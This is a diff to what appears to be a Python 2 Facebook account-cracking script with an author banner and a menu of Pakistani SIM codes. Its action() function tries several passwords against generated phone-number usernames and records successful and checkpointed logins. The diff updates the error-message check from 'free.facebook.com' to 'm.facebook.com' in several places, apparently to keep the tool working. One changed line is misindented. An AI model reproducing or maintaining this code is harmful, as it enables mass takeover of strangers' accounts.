@@ -133,7 +133,6 @@ logo = """
     \x1b[1;95m |______|______|_____|  |_|  |______|                                     
 
                                                                                                                                                                       
-
 \x1b[1;92m_________________________________________________
 
 \x1b[1;94m\033[1;96mAuthor   :            SOHAIL & FAHIM
@@ -147,7 +146,6 @@ logo = """
 \x1b[1;90m__________________________________________________
 
                                                  """
-
 logo1 = '     \n\n\x1b[4;96mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;96m[1] Jazz    \x1b[1;97m 00,01,02,03,04,05,06,07,08\n\x1b[1;96m[2] Zong    \x1b[1;97m 11,12,13,14,15,16,17\n\x1b[1;96m[3] Warid   \x1b[1;97m 21,22,23,24,25\n\x1b[1;96m[4] Ufone   \x1b[1;97m 30,31,32,33,34,35\n\x1b[1;96m[5] Telenor \x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
 
 back = 0
@@ -282,7 +280,7 @@ def action():
 
                 oks.append(c + user + pass1)
 
-            elif 'free.facebook.com' in q['error_msg']:
+            elif 'm.facebook.com' in q['error_msg']:
 
                 print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass1
 
@@ -314,7 +312,7 @@ def action():
 
                     oks.append(c + user + pass2)
 
-                elif 'free.facebook.com' in q['error_msg']:
+                elif 'm.facebook.com' in q['error_msg']:
 
                     print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass2
 
@@ -346,7 +344,7 @@ def action():
 
                         oks.append(c + user + pass3)
 
-                    elif 'free.facebook.com' in q['error_msg']:
+                    elif 'm.facebook.com' in q['error_msg']:
 
                         print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass3
 
@@ -378,7 +376,7 @@ def action():
 
                         oks.append(c + user + pass3)
 
-                       elif 'free.facebook.com' in q['error_msg']:
+                       elif 'm.facebook.com' in q['error_msg']:
 
                         print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass4
 
